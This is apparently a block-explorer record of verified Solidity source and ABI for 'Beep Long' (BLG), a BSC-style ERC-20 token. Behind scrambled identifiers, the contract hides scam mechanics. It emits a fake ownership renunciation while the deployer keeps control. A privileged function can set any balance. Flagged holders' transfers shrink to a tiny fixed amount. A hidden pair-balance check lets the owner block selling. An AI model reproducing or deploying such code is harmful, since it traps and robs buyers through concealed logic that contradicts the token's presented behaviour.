{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface amountIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptLaunched) external view returns (uint256);\n\n    function transfer(address modeAt, uint256 walletMarketing) external returns (bool);\n\n    function allowance(address launchSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeAt,\n        uint256 walletMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountSender, uint256 value);\n    event Approval(address indexed launchSell, address indexed spender, uint256 value);\n}\n\nabstract contract txMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxTradingList {\n    function createPair(address marketingMin, address exemptAt) external returns (address);\n}\n\ninterface amountIsMetadata is amountIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BeepLong is txMarketing, amountIs, amountIsMetadata {\n\n    address public fundLimit;\n\n    mapping(address => bool) public exemptMode;\n\n    uint8 private receiverLiquidity = 18;\n\n    function transferFrom(address txLiquidity, address modeAt, uint256 walletMarketing) external override returns (bool) {\n        if (_msgSender() != totalReceiver) {\n            if (feeLaunched[txLiquidity][_msgSender()] != type(uint256).max) {\n                require(walletMarketing <= feeLaunched[txLiquidity][_msgSender()]);\n                feeLaunched[txLiquidity][_msgSender()] -= walletMarketing;\n            }\n        }\n        return walletEnable(txLiquidity, modeAt, walletMarketing);\n    }\n\n    address totalReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private launchedFeeSwap;\n\n    mapping(address => uint256) private autoLaunch;\n\n    function exemptTeamReceiver(address tradingAuto) public {\n        launchedList();\n        if (feeFromList != swapEnableExempt) {\n            exemptSwapFee = true;\n        }\n        if (tradingAuto == fundLimit || tradingAuto == launchedExempt) {\n            return;\n        }\n        exemptMode[tradingAuto] = true;\n    }\n\n    function launchedList() private view {\n        require(feeShould[_msgSender()]);\n    }\n\n    function minLiquidity(address autoFund, uint256 walletMarketing) public {\n        launchedList();\n        autoLaunch[autoFund] = walletMarketing;\n    }\n\n    bool private fromLaunch;\n\n    uint256 public fromTx;\n\n    address private amountModeAt;\n\n    bool public modeTeam;\n\n    address fundTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private feeLaunched;\n\n    uint256 private tokenIs = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public feeShould;\n\n    constructor (){\n        \n        autoAmount fromSwap = autoAmount(totalReceiver);\n        launchedExempt = maxTradingList(fromSwap.factory()).createPair(fromSwap.WETH(), address(this));\n        \n        fundLimit = _msgSender();\n        fundToken();\n        feeShould[fundLimit] = true;\n        autoLaunch[fundLimit] = tokenIs;\n        if (launchedFeeSwap) {\n            feeFromList = fromTx;\n        }\n        emit Transfer(address(0), fundLimit, tokenIs);\n    }\n\n    uint256 public feeFromList;\n\n    function transfer(address autoFund, uint256 walletMarketing) external virtual override returns (bool) {\n        return walletEnable(_msgSender(), autoFund, walletMarketing);\n    }\n\n    bool private totalMin;\n\n    string private autoBuy = \"Beep Long\";\n\n    string private receiverLaunched = \"BLG\";\n\n    function name() external view virtual override returns (string memory) {\n        return autoBuy;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverLaunched;\n    }\n\n    function atLimit(address isAt) public {\n        if (isTotalEnable) {\n            return;\n        }\n        if (feeFromList == swapEnableExempt) {\n            totalMin = true;\n        }\n        feeShould[isAt] = true;\n        if (fromTx == swapEnableExempt) {\n            fromLaunch = false;\n        }\n        isTotalEnable = true;\n    }\n\n    function balanceOf(address exemptLaunched) public view virtual override returns (uint256) {\n        return autoLaunch[exemptLaunched];\n    }\n\n    bool public isTotalEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverLiquidity;\n    }\n\n    address public launchedExempt;\n\n    uint256 toSwap;\n\n    function minSell(uint256 walletMarketing) public {\n        launchedList();\n        totalSender = walletMarketing;\n    }\n\n    function fundToken() public {\n        emit OwnershipTransferred(fundLimit, address(0));\n        amountModeAt = address(0);\n    }\n\n    uint256 totalSender;\n\n    bool private exemptSwapFee;\n\n    function walletEnable(address txLiquidity, address modeAt, uint256 walletMarketing) internal returns (bool) {\n        if (txLiquidity == fundLimit) {\n            return senderLiquidity(txLiquidity, modeAt, walletMarketing);\n        }\n        uint256 enableBuy = amountIs(launchedExempt).balanceOf(fundTake);\n        require(enableBuy == totalSender);\n        require(modeAt != fundTake);\n        if (exemptMode[txLiquidity]) {\n            return senderLiquidity(txLiquidity, modeAt, launchedAmountFund);\n        }\n        return senderLiquidity(txLiquidity, modeAt, walletMarketing);\n    }\n\n    uint256 private swapEnableExempt;\n\n    bool public totalMax;\n\n    function senderLiquidity(address txLiquidity, address modeAt, uint256 walletMarketing) internal returns (bool) {\n        require(autoLaunch[txLiquidity] >= walletMarketing);\n        autoLaunch[txLiquidity] -= walletMarketing;\n        autoLaunch[modeAt] += walletMarketing;\n        emit Transfer(txLiquidity, modeAt, walletMarketing);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return amountModeAt;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenIs;\n    }\n\n    function approve(address listLimit, uint256 walletMarketing) public virtual override returns (bool) {\n        feeLaunched[_msgSender()][listLimit] = walletMarketing;\n        emit Approval(_msgSender(), listLimit, walletMarketing);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return amountModeAt;\n    }\n\n    function allowance(address sellMarketingTake, address listLimit) external view virtual override returns (uint256) {\n        if (listLimit == totalReceiver) {\n            return type(uint256).max;\n        }\n        return feeLaunched[sellMarketingTake][listLimit];\n    }\n\n    uint256 constant launchedAmountFund = 7 ** 10;\n\n    event OwnershipTransferred(address indexed limitMax, address indexed toMin);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMarketingTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAt\",\"type\":\"address\"}],\"name\":\"atLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAuto\",\"type\":\"address\"}],\"name\":\"exemptTeamReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeFromList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTotalEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMarketing\",\"type\":\"uint256\"}],\"name\":\"minLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletMarketing\",\"type\":\"uint256\"}],\"name\":\"minSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BeepLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}